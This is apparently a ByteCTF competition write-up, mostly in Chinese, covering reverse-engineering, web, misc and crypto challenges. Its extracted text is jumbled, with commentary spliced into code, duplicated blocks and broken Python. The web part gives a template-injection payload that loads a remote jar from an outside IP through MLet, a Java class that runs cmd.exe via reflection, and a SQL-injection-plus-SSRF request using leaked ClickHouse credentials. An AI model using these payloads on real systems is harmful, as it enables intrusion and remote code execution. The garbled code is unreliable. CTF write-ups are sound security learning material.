1010001111"""
mapping = {}
for c in range(len(t1)):
    mapping[t1[c]] = d1.splitlines()[c]
for c in range(len(t2)):
    mapping[t2[c]] = d2.splitlines()[c]
mapping['_'] = '01010'
mapping['('] = '010011'
mapping[')'] = '111100'
mapping['#'] = '101001'
mapping['@'] = '1110011'
mapping['!'] = '00110110'
mapping['%'] = '00010'
mapping['^'] = '01111'
mapping['&'] = '10100011100'
mapping['*'] = '0110010'
mapping['-'] = '10100010'
mapping['='] = '000000'
mapping['+'] = '10111'
mapping[';'] = '1010000'
mapping['['] = '110011'
mapping[']'] = '00100'
print(mapping)
r = "".join([bin(nn)[2:].rjust(8, "0") for nn in r if nn != 0])
flag = ''
while len(r) > 0:
    find = 0
    maxLen = 0
    maxf = ''
    for k in mapping:
        if r.startswith(mapping[k]):
0x6d21
虽然前⾯⾮常多的运算，但是抓住关键的处理输⼊的地⽅
中间这个malloc分配了⼀个space
然后后⾯⼀段，将输⼊的字符串的每个字符转换成四个字节之后存放到space中
            if find == 0:
                maxLen = len(mapping[k])
                maxf = k
            elif len(mapping[k]) > maxLen:
                maxLen = len(mapping[k])
                maxf = k
            find += 1
    # if find != 1:
    #     print("error:", find)
    #     break
    if find != 0:
        flag += maxf
        r = r[maxLen:]
        print(flag, find, r)
    else:
        print("nnnnnn:", flag, r)
        break
# 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;?
@[\\]^_`{|}~
# bytectf{wxyz000000000000000000000000000[}
# bytectf{0000000000000000000000000000000C}
print(r)
找到关键运算
分析出指令就是⼀些乘法和⼀些乘加指令，实现了矩阵乘法
通过这⾥从内存中取出的数据恢复出与输⼊矩阵相乘的矩阵：
然后找到最后的⽐较数据
# 固定矩阵
fixed = [[1, 1, 2, 3],
         [5, 8, 0xd, 0x15],
         [0x15, 0xd, 8, 5],
         [3, 2, 1, 1]]
写出脚本解⼀个简单矩阵乘法即可：
Web
Unsecure Blog
原本的enjoy模板引擎限制很⼤，想着⽤ScriptEngineManage执⾏代码，但是需要获取⼀个ScriptEngineManage
实例，newInstance被ban掉了，所以另寻他路
翻了⼀下依赖的jar包，最后在ehcache-core-2.6.11.jar⾥⾯找到⼀个ClassLoaderUtil，实现了⼀个public static 
Object createNewInstance(String className)⽅法，可以获取类实例。
可以执⾏js之后，⽤jmx绕过securityManager
dst = [[0xD2C, 0xA3D, 0X9D9, 0xBF2],
       [0xB1C, 0x95C, 0xA12, 0xD1E],
       [0xB72, 0x93F, 0x957, 0xBCC],
       [0x55F, 0x559, 0x6DA, 0x9E1]]
fixed = [[1, 1, 2, 3],
         [5, 8, 0xd, 0x15],
         [0x15, 0xd, 8, 5],
         [3, 2, 1, 1]]
dst = [[0xD2C, 0xA3D, 0X9D9, 0xBF2],
       [0xB1C, 0x95C, 0xA12, 0xD1E],
       [0xB72, 0x93F, 0x957, 0xBCC],
       [0x55F, 0x559, 0x6DA, 0x9E1]]
fixed = Matrix(ZZ, fixed)
dst = Matrix(ZZ, dst)
inp = dst * fixed^(-1)
print(inp)
x = ''
for i in range(4):
    for j in range(4):
        x += chr(inp[i, j])
print(x)
#set(sem=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance('javax.script.ScriptEng
ineManager',null,null))#set(eng=sem.getEngineByExtension('js'))#(eng.eval("mLet = new 
javax.management.loading.MLet();mLet.addURL(new 
java.net.URL('http://42.192.136.148:8886/exp.jar'));mLet.loadClass('exp12').newInstance
();"))
import java.io.IOException;
double sqli
看报错是⼀个clickhouse，注⼊⼀波，在hint表中找到提示you_dont_have_permissions_to_read_flag
发现file⽬录可⽤穿越，在http://39.105.175.150:30001/files../var/lib/clickhouse/access/3349ea06-b1c1-514f-e
1e9-c8d6e8080f89.sql，下载到创建⽤户的sql
然后ssrf连接到8123端⼝，⽤获取到的帐号密码登录，
GET /?id=1%20union%20all%20select%20%20from%20url(%27http://localhost:8123/?user=user_01%26passwor
d=e3b0c44298fc1c149afb%26database=ctf%26query=SELECT%2520FROM%2520flag%27,%20%27CSV%27,%20
%27test%20String%27); HTTP/1.1 User-Agent: PostmanRuntime/7.28.4 Accept: / Postman-Token: 638e3b1b-
c751-4666-9eaa-59dcdd08bece Host: 39.105.175.150:30001 Accept-Encoding: gzip, deflate Connection: close
Misc
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;
public class exp12 {
    public exp12() throws Exception{
        try {
            String[] cmds = new String[]{"C:\\windows\\system32\\cmd.exe", "/c", "reg 
query HKEY_CURRENT_USER\\ByteCTF\\ /S >C:\\windows\\temp\\qiyou12345.txt"};
          Class clazz = Class.forName("java.lang.ProcessImpl");
          Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, 
String.class, ProcessBuilder.Redirect[].class, boolean.class);
          method.setAccessible(true);
          Process e = (Process) method.invoke(null, cmds, null, ".", null, true);
          byte[] bs = new byte[2048];
          int readSize = 0;
          ByteArrayOutputStream infoStream = new ByteArrayOutputStream();
          while ((readSize = e.getInputStream().read(bs)) > 0) {
              infoStream.write(bs, 0, readSize);
          }
          System.out.println(infoStream.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
checkin
签到
Survey
问卷
HearingNotBelieving
频域
前段频谱隐写⼆维码，后⾯sstv-robot36隐写⼆维码，扫码拼接
Crypto
JustDecrypt
from pwn import *
HOST = "39.105.115.244"
POST = 30001
r = remote(HOST, POST)
def proof_of_work():
    rev = r.recvuntil("sha256(XXXX+")
overhead
    suffix = r.recv(28).decode()
    rev = r.recvuntil(" == ")
    tar = r.recv(64).decode()
    def f(x):
        hashresult = hashlib.sha256(x.encode()+suffix.encode()).hexdigest()
        return hashresult == tar
    prefix = util.iters.mbruteforce(f, string.digits + string.ascii_letters, 4, 'upto')
    r.recvuntil("Give me XXXX >")
    r.sendline(prefix)
proof_of_work()
a = b"Hello, I'm a Bytedancer. Please give me the flag!" + b"\x0f"*15
b = b''
for i in range(50):
    r.recvuntil(b'Please enter your cipher in hex > ')
    data = b.hex()+'00'*(400-len(b))
    r.sendline(data.encode())
    r.recvuntil('Your plaintext in hex: ')
    data = r.recvline()
    data = r.recvline()
    data = bytes.fromhex(data.decode())
    if i==0:
        b += bytes([data[-1]^a[0]])
    else:
        b += bytes([data[i]^a[i]])
b = b[:-1] + b'\x00'*14 + bytes([data[63]^15])
r.recvuntil(b'Please enter your cipher in hex > ')
data = b.hex()
r.sendline(data)
r.interactive()
from pwn import remote
from pwnlib.tubes.tube import *
from hashlib import sha256
from Crypto.Util.number import *
from tqdm import tqdm
from sage.modules.free_module_integer import IntegerLattice
import itertools
r = remote('39.105.38.192', '30000')
load("coppersmith.sage")
p = 62606792596600834911820789765744078048692259104005438531455193685836606544743
g = 5
easyxor
P. = PolynomialRing(Zmod(p))
r.sendlineafter('$ ', '1')
Alice = int(r.recvline().decode())
r.sendlineafter('$ ', '2')
Bob = int(r.recvline().decode())
r.sendlineafter('$ ', '3')
r.sendlineafter('To Bob: ', str(Alice**2))
s2 = int(r.recvline().decode())
r.sendlineafter('$ ', '3')
r.sendlineafter('To Bob: ', str(Alice))
s1 = int(r.recvline().decode())
f = (s1+x)^2 - s2 - y
res = small_roots(f, bounds=(2**64, 2**64), m=4)
r.sendlineafter('$ ', '4')
r.sendlineafter('secret: ', str(s1+res[0][0]))
r.interactive()
from Crypto.Util.number import *
c = 
bytes.fromhex('89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee7
48e0da3c989da2bba657b912')
cg = []
m0 = bytes_to_long(b'ByteCTF{')
for i in range(6):
    cg.append(bytes_to_long(c[i * 8: (i + 1) * 8]))
from Crypto.Util.number import bytes_to_long, long_to_bytes
from random import randint, getrandbits
def shift(m, k, c):
    if k > (-k) & c
    return m ^ m << k & c
def convert(m, key):
    c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 
0x964c5a89f6d3ae8c]
    for t in range(4):
        m = shift(m, key[t], c_list[t])
    return m
'''
keys = [0]*4
for keys[0] in range(-32,33):
    for keys[1] in range(-32,33):
        for keys[2] in range(-32,33):
            for keys[3] in range(-32,33):
             cur_c = cg[0]^m0
             cur_c = convert(cur_c,keys)
             m1 = cur_c ^ cg[1]
             cur_c = convert(cur_c,keys)
             m2 = cur_c ^ cg[2]
             front = long_to_bytes(m1)+long_to_bytes(m2)
             for k in front:
                 if k not in range(32,127):
                     break
             else:
                 print(keys,front)
'''
key = [-12, 26, -3, -31]
front = b'BytesCTF{5831a241s-f30980'
def encrypt(m, k, iv, mode='CBC'):
    assert len(m) % 8 == 0
    num = len(m) // 8
    groups = []
    for i in range(num):
        groups.append(bytes_to_long(m[i * 8: (i + 1) * 8]))
    last = iv
    cipher = []
    if mode == 'CBC':
        for eve in groups:
            cur = eve ^ last
            cur_c = convert(cur, k)
            cipher.append(cur_c)
            last = cur_c
    elif mode == 'OFB':
        for eve in groups:
            cur_c = convert(last, k)
            cipher.append(cur_c ^ eve)
            last = cur_c
    else:
        print('Not supported now!')
    return ''.join([hex(eve)[2:].strip('L').rjust(16, '0') for eve in cipher])
iv = 16476971533267772345
c1 = 10780708739817148043
c2 = 738617756395427640
c3 = 10936161096540945944
back = long_to_bytes(cg[3]^c2)+long_to_bytes(iv^c1)+long_to_bytes(cg[4]^c3)
print(front+back)